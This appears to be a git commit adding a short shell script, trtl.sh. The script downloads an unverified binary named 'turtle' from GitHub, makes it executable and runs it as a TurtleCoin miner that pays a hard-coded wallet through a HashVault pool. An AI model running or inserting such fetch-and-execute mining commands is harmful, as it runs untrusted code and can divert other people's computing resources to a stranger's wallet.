b94f4be8e63fce16ded94115c54637a506d2c2af
TurboHeinz <96130740+TurboHeinz@users.noreply.github.com>
2021-12-15 16:04:06 +0300

    Add files via upload

---
+++ trtl.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+
+wget https://github.com/TurboHeinz/LM/raw/main/turtle
+chmod +x turtle
+./turtle -a chukwa2 -o stratum+ssl://pool.hashvault.pro:80 -u TRTLuweEwEqPstNHhkvxX6UPy4Nw9WAN8gFmeyDHE1Mr54WVPgwUq1L9DqHKCjmcKNHvoNfrh7w7VHVBj1efakotfkt2jeroLmy.80f33f2d7faf31c58421133e232acab3c0387b8009d20bc71c77cbb7e99478fc
